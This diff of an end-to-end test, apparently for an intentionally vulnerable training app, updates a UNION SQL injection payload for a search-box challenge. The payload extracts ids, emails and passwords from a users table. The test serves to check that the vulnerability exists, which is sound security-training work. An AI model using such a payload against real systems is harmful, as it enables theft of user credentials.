@@ -30,7 +30,7 @@ describe('/#/search', function () {
     describe('challenge "unionSqlI"', function () {
 
         it('search query should be susceptible to UNION SQL injection attacks', function () {
-            searchQuery.sendKeys('\') union select null,id,email,password,null,null,null from users--');
+            searchQuery.sendKeys('\')) union select null,id,email,password,null,null,null from users--');
             searchButton.click();
 
             var productDescriptions = element.all(by.repeater('product in products').column('description'));
